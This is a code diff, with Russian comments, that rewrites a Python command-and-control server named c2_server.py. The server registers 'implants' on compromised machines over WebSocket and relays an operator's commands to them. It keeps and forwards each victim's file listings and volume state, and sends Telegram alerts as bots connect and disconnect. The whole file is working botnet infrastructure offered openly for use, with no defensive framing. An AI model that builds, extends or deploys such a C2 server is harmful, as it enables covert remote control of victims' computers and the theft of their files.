@@ -1,129 +1,141 @@
-import asyncio
-import os
+#
+# --- Файл: c2_server.py (Версия 2.1 - Пуленепробиваемый) ---
+#
+import asyncio, json, os, threading, urllib.parse, urllib.request
 from aiohttp import web
-import json # <-- Импортируем для отлова конкретной ошибки
+import settings
 
-# ==============================================================================
-# ГЛОБАЛЬНОЕ СОСТОЯНИЕ СЕРВЕРА
-# ==============================================================================
+def send_telegram_message(message):
+  """Асинхронно отправляет сообщение в Telegram в отдельном потоке."""
+  def send():
+    try:
+      url = f"https://api.telegram.org/bot{settings.BOT_TOKEN}/sendMessage?chat_id={settings.CHAT_ID}&text={urllib.parse.quote_plus(message)}"
+      urllib.request.urlopen(url, timeout=10)
+    except Exception as e:
+      print(f"[!] Ошибка отправки в Telegram: {e}")
+  threading.Thread(target=send, daemon=True).start()
 
-IMPLANTS = {}
-OPERATOR = None
-
-# ==============================================================================
-# ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ
-# ==============================================================================
-
-async def broadcast_bot_list():
- """
- Рассылает обновленный список ботов, только если оператор на месте.
- """
- if OPERATOR and not OPERATOR.closed:
-  bot_ids = list(IMPLANTS.keys())
-  print(f"[*] Обновление списка ботов для оператора: {bot_ids}")
-  try:
-   await OPERATOR.send_json({'type': 'bot_list', 'data': bot_ids})
-  except (ConnectionResetError, asyncio.CancelledError):
-   print("[!] Оператор отключился во время отправки списка ботов.")
- else:
-  print("[*] Список ботов изменился, но оператор не в сети. Отправка отменена.")
-
-# ==============================================================================
-# ОБРАБОТЧИКИ HTTP И WEBSOCKET
-# ==============================================================================
-
-async def handle_index(request):
- """Отдаёт HTML-панель управления."""
- return web.FileResponse('./index.html')
+IMPLANTS, OPERATOR = {}, None
 
 async def websocket_handler(request):
- """Главный обработчик WebSocket соединений."""
- ws = web.WebSocketResponse()
- await ws.prepare(request)
+  global OPERATOR, IMPLANTS
+  ws = web.WebSocketResponse(); await ws.prepare(request)
+  client_type, client_id = None, None
+  try:
+    # Пытаемся получить первое сообщение. Если клиент отвалится тут - это не страшно.
+    initial_msg_raw = await ws.receive(timeout=15.0)
+    if initial_msg_raw.type != web.WSMsgType.TEXT:
+      await ws.close()
+      return ws
 
- client_type = None
- client_id = None
- global OPERATOR
+    initial_msg = json.loads(initial_msg_raw.data)
+    client_type = initial_msg.get('type')
 
- try:
-  async for msg in ws:
-   if msg.type == web.WSMsgType.TEXT:
-
-    # <<< ГЛАВНЫЙ ФИКС: КЕВЛАРОВАЯ ПЛАСТИНА ПРОТИВ МУСОРА >>>
-    # Пытаемся прочитать сообщение. Если это не JSON - игнорируем.
-    try:
-     data = msg.json()
-    except json.JSONDecodeError:
-     print(f"[!] Получен мусор от клиента (вероятно, предсмертный хрип), игнорирую.")
-     continue # <-- Переходим к следующему сообщению
-
-    msg_type = data.get('type')
-
-    # --- ЭТАП 1: Идентификация клиента ---
-    if client_type is None:
-     if msg_type == 'operator':
-      client_type = 'operator'
+    if client_type == 'operator':
       OPERATOR = ws
       print("[+] Оператор подключился.")
       await broadcast_bot_list()
-      continue
-
-     elif msg_type == 'implant':
-      client_type = 'implant'
-      client_id = data.get('id')
-      if client_id:
-       IMPLANTS[client_id] = ws
-       print(f"[+] Новый имплант в сети: {client_id}")
-       await broadcast_bot_list()
-      if OPERATOR and not OPERATOR.closed:
-       await OPERATOR.send_json({'type': 'bot_details', 'bot_id': client_id, 'data': data})
-      continue
-
-    # --- ЭТАП 2: Маршрутизация сообщений ---
-    if client_type == 'operator':
-     # Пересылка команд от оператора к импланту
-     target_id = data.get('target_id')
-     payload = data.get('payload')
-     if target_id in IMPLANTS:
-      target_ws = IMPLANTS[target_id]
-      # Проверяем, жив ли имплант перед отправкой
-      if not target_ws.closed:
-       await target_ws.send_json(payload)
-      else:
-       del IMPLANTS[target_id]
-       await broadcast_bot_list()
-     else:
-      await OPERATOR.send_json({'type': 'status', 'data': f"Ошибка: бот {target_id} не в сети."})
-
     elif client_type == 'implant':
-     # Пересылка сообщений от импланта к оператору
-     if OPERATOR and not OPERATOR.closed:
-      data['bot_id'] = client_id
-      await OPERATOR.send_json(data)
+      client_id = initial_msg.get('id')
+      IMPLANTS[client_id] = {
+        "ws": ws,
+        "files": initial_msg.get('files', {}),
+        "volume_state": initial_msg.get('volume_state', {})
+      }
+      print(f"[+] Новый имплант онлайн: {client_id}")
+      send_telegram_message(f"✅ Имплант ОНЛАЙН: {client_id}")
+      await broadcast_bot_list()
+    else:
+      await ws.close()
+      return ws
 
- except asyncio.CancelledError:
-  print(f"[-] Соединение с {client_id or 'клиентом'} было принудительно разорвано.")
- finally:
-  # --- ЭТАП 3: Очистка после отключения ---
-  if client_type == 'operator':
-   OPERATOR = None
-   print("[-] Оператор отключился.")
-  elif client_type == 'implant' and client_id in IMPLANTS:
-   del IMPLANTS[client_id]
-   print(f"[-] Имплант отключился: {client_id}")
-   await broadcast_bot_list()
+    async for msg in ws:
+      if msg.type == web.WSMsgType.TEXT:
+        if msg.data == 'ping': 
+          await ws.send_str('pong')
+          continue
 
- return ws
+        # <<< ГЛАВНЫЙ ФИКС: КЕВЛАРОВАЯ ПЛАСТИНА >>>
+        # Прежде чем доверять сообщению, проверяем, не мусор ли это.
+        try:
+          data = json.loads(msg.data)
+        except json.JSONDecodeError:
+          print(f"[!] Получен мусор от {client_id or 'неизвестного'}, игнорирую.")
+          continue # Просто переходим к следующему сообщению
 
-# ==============================================================================
-# ЗАПУСК СЕРВЕРА
-# ==============================================================================
+        if client_type == 'operator':
+          target_id = data.get('target_id')
+          command_type = data.get('type')
 
-app = web.Application()
-app.router.add_get('/', handle_index)
-app.router.add_get('/ws', websocket_handler)
+          # Маршрутизация команд от оператора
+          if command_type == 'command' and target_id in IMPLANTS:
+            await IMPLANTS[target_id]["ws"].send_json(data['payload'])
+          elif command_type == 'get_details' and target_id in IMPLANTS:
+            details = {
+              "files": IMPLANTS[target_id].get("files"),
+              "volume_state": IMPLANTS[target_id].get("volume_state")
+            }
+            await OPERATOR.send_json({'type': 'bot_details', 'bot_id': target_id, 'data': details})
+          elif command_type == 'get_volume_state' and target_id in IMPLANTS:
+             await IMPLANTS[target_id]["ws"].send_json(data['payload'])
 
-if __name__ == '__main__':
- port = int(os.environ.get("PORT", 8080))
- web.run_app(app, host='0.0.0.0', port=port)
- print(f"C2 сервер запущен на порту {port}")
+        elif client_type == 'implant':
+          # Маршрутизация сообщений от импланта
+          msg_from_implant_type = data.get('type')
+          if msg_from_implant_type == 'file_list_update':
+            if client_id in IMPLANTS:
+              IMPLANTS[client_id]["files"] = data.get('data', {})
+          elif msg_from_implant_type == 'volume_update':
+             if client_id in IMPLANTS:
+              IMPLANTS[client_id]["volume_state"] = data.get('data', {})
+
+          # В любом случае пересылаем всё оператору
+          if OPERATOR:
+            data['bot_id'] = client_id
+            await OPERATOR.send_json(data)
+
+  except asyncio.TimeoutError:
+    print("[!] Таймаут получения начального сообщения.")
+  except Exception as e:
+    print(f"[!] Непредвиденная ошибка в websocket_handler: {e}")
+  finally:
+    if client_type == 'implant' and client_id in IMPLANTS:
+      del IMPLANTS[client_id]
+      print(f"[-] Имплант отключился: {client_id}")
+      send_telegram_message(f"❌ Имплант ОТКЛЮЧИЛСЯ: {client_id}")
+      await broadcast_bot_list()
+    elif client_type == 'operator':
+      OPERATOR = None
+      print("[-] Оператор отключился.")
+  return ws
+
+async def broadcast_bot_list():
+  if OPERATOR and not OPERATOR.closed:
+    try:
+      bot_ids = list(IMPLANTS.keys())
+      await OPERATOR.send_json({'type': 'bot_list', 'data': bot_ids})
+    except ConnectionResetError:
+      print("[!] Попытка отправить список отключенному оператору.")
+
+async def http_handler(request):
+  return web.FileResponse(os.path.join(os.path.dirname(__file__), 'index.html'))
+
+async def main():
+  app = web.Application()
+  app.router.add_get('/', http_handler)
+  app.router.add_get('/ws', websocket_handler)
+  runner = web.AppRunner(app)
+  await runner.setup()
+  site = web.TCPSite(runner, '0.0.0.0', 10000)
+  await site.start()
+  print("====== C2 SERVER (V2.1) ONLINE ======")
+  send_telegram_message("🚀 Сервер 'Крепость' V2.1 запущен.")
+  await asyncio.Event().wait()
+
+if __name__ == "__main__":
+  try:
+    asyncio.run(main())
+  except KeyboardInterrupt:
+    print("\nСервер остановлен вручную.")
+  finally:
+    send_telegram_message("🛑 Сервер 'Крепость' V2.1 остановлен.")
